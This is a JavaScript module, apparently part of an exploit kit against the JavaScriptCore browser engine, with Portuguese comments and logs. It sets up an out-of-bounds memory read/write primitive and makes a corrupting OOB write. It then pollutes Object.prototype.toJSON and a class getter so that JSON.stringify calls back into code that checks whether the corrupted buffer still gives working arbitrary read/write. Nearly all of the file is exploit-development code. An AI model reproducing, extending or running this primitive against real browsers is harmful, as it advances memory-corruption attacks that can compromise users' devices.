// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForIntegrityTest";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, data_read: null };

const DATA_PATTERN_TO_WRITE_READ = 0x12345678;
const DATA_OFFSET_FOR_INTEGRITY_TEST = 0x100; // Offset dentro do oob_array_buffer_real (relativo ao início do backing store)

class CheckpointObjectForIntegrityTest {
    constructor(id) {
        this.id = `IntegrityTestCheckpoint-${id}`;
    }
}

export function toJSON_TriggerIntegrityTestGetter() {
    const FNAME_toJSON = "toJSON_TriggerIntegrityTestGetter";
    if (this instanceof CheckpointObjectForIntegrityTest) {
        logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        } catch (e) {
            logS3(`toJSON: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    return this.id;
}

// A função exportada mantém o nome para compatibilidade
export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST = "executeIntegrityTestInGetter";
    logS3(`--- Iniciando Teste de Integridade do oob_array_buffer_real no Getter ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null, data_read: null };

    // Validações de config...
    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) {
        logS3("Offsets críticos não definidos. Abortando.", "critical", FNAME_TEST);
        current_test_results.message = "Offsets críticos não definidos.";
        return;
    }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            current_test_results = { success: false, message: "Falha ao inicializar OOB.", error: "OOB env not set" };
            logS3(current_test_results.message, "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Escrever o padrão de dados no offset de teste ANTES de acionar o getter
        logS3(`Escrevendo padrão de dados ${toHex(DATA_PATTERN_TO_WRITE_READ)} em oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}]...`, "info", FNAME_TEST);
        oob_write_absolute(DATA_OFFSET_FOR_INTEGRITY_TEST, DATA_PATTERN_TO_WRITE_READ, 4); // Escreve 4 bytes

        // 2. Realizar a escrita OOB "gatilho" que aciona o getter
        const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // Valor conhecido por acionar o getter
        oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
        logS3(`Escrita OOB gatilho em ${toHex(corruption_trigger_offset_abs)} do oob_data completada.`, "info", FNAME_TEST);

        // 3. Configurar o getter e poluir
        const checkpoint_obj = new CheckpointObjectForIntegrityTest(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForIntegrityTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForIntegrityTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() { // Getter SÍNCRONO
                getter_called_flag = true;
                const FNAME_GETTER = "IntegrityTest_Getter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Testando leitura de oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}]...`, "vuln", FNAME_GETTER);
                
                let read_value = null;
                let read_error = null;

                try {
                    if (!oob_array_buffer_real || !oob_read_absolute) { // Verifica oob_read_absolute também
                        current_test_results.message = "oob_array_buffer_real ou oob_read_absolute era null no getter.";
                        logS3("DENTRO DO GETTER: oob_array_buffer_real ou oob_read_absolute é null!", "critical", FNAME_GETTER);
                        return 0xDEADDEAD;
                    }

                    logS3(`DENTRO DO GETTER: Tentando ler de oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}] usando oob_read_absolute...`, "info", FNAME_GETTER);
                    read_value = oob_read_absolute(DATA_OFFSET_FOR_INTEGRITY_TEST, 4); // Lê 4 bytes
                    current_test_results.data_read = toHex(read_value);

                    if (read_value === DATA_PATTERN_TO_WRITE_READ) {
                        logS3(`DENTRO DO GETTER: SUCESSO! Lido ${toHex(read_value)} corretamente de oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}]. oob_array_buffer_real está íntegro para R/W.`, "good", FNAME_GETTER);
                        current_test_results = { success: true, message: `oob_array_buffer_real íntegro. Lido ${toHex(read_value)} corretamente.`, data_read: toHex(read_value), error: null };
                    } else {
                        logS3(`DENTRO DO GETTER: FALHA NA INTEGRIDADE! Lido ${toHex(read_value)} de oob_data[${toHex(DATA_OFFSET_FOR_INTEGRITY_TEST)}], esperado ${toHex(DATA_PATTERN_TO_WRITE_READ)}.`, "error", FNAME_GETTER);
                        current_test_results = { success: false, message: `Falha na integridade do oob_array_buffer_real. Lido ${toHex(read_value)}, esperado ${toHex(DATA_PATTERN_TO_WRITE_READ)}.`, data_read: toHex(read_value), error: "Mismatch" };
                    }

                } catch (e) {
                    logS3(`DENTRO DO GETTER: ERRO durante oob_read_absolute: ${e.message}`, "error", FNAME_GETTER);
                    read_error = String(e);
                    current_test_results = { success: false, message: `Erro ao ler de oob_array_buffer_real no getter: ${e.message}`, data_read: null, error: read_error };
                }
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerIntegrityTestGetter, writable: true, enumerable: false, configurable: true});
        toJSONPollutionApplied = true;
        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError), data_read: null };
    } finally {
        // Restauração
        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { delete Object.prototype[ppKey_val]; if(originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc); }
        if (getterPollutionApplied && CheckpointObjectForIntegrityTest.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { delete CheckpointObjectForIntegrityTest.prototype[GETTER_CHECKPOINT_PROPERTY_NAME]; if(originalGetterDesc) Object.defineProperty(CheckpointObjectForIntegrityTest.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, originalGetterDesc); }
        logS3("Limpeza finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE INTEGRIDADE: ${current_test_results.message}`, "good", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE INTEGRIDADE: Getter chamado, mas falha/erro. ${current_test_results.message}`, "error", FNAME_TEST);
        }
    } else {
        logS3("RESULTADO TESTE INTEGRIDADE: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }
    logS3(`  Detalhes finais: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste de Integridade do oob_array_buffer_real Concluído ---`, "test", FNAME_TEST);
}
